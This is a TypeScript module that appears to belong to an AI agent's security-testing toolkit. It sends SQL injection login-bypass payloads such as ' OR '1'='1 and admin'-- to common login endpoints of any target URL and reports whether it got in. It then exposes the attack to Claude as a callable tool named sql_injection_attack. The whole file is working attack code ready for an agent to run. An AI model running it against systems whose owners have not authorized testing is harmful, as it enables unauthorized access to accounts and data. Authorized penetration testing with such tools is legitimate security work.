import type { AttackResult } from '../types.js'

const PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",
]

const ENDPOINTS = ['/api/login', '/login', '/auth', '/api/auth']

export async function sqlInjectionAttack(targetUrl: string): Promise<AttackResult> {
  for (const endpoint of ENDPOINTS) {
    for (const payload of PAYLOADS) {
      try {
        const response = await fetch(`${targetUrl}${endpoint}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: payload, password: 'x' }),
          signal: AbortSignal.timeout(5000),
        })

        const data = (await response.json()) as Record<string, unknown>
        const text = JSON.stringify(data).toLowerCase()

        const injectionSucceeded =
          data.success === true ||
          text.includes('welcome') ||
          text.includes('admin') ||
          text.includes('administrator') ||
          text.includes('dashboard')

        if (injectionSucceeded) {
          return {
            success: true,
            attackType: 'SQL_INJECTION',
            vulnerability: 'SQL injection in login form — unsanitized string concatenation',
            location: `${endpoint} (username field)`,
            severity: 'CRITICAL',
            payload,
            evidence: JSON.stringify(data).slice(0, 200),
            timestamp: Date.now(),
          }
        }
      } catch {
        // endpoint doesn't exist or timed out — try next
        continue
      }
    }
  }

  return {
    success: false,
    attackType: 'SQL_INJECTION',
    vulnerability: 'No SQL injection vulnerability found',
    location: 'login endpoints',
    severity: 'LOW',
    timestamp: Date.now(),
  }
}

// Skill descriptor for Claude tool use
export const sqlInjectionSkill = {
  name: 'sql_injection_attack',
  description:
    'Tests a target URL for SQL injection vulnerabilities by attempting common payloads against login endpoints. Returns whether the target is vulnerable with full evidence.',
  input_schema: {
    type: 'object' as const,
    properties: {
      targetUrl: { type: 'string', description: 'The base URL of the target (e.g. http://localhost:3000)' },
    },
    required: ['targetUrl'],
  },
  execute: async ({ targetUrl }: { targetUrl: string }) => sqlInjectionAttack(targetUrl),
}
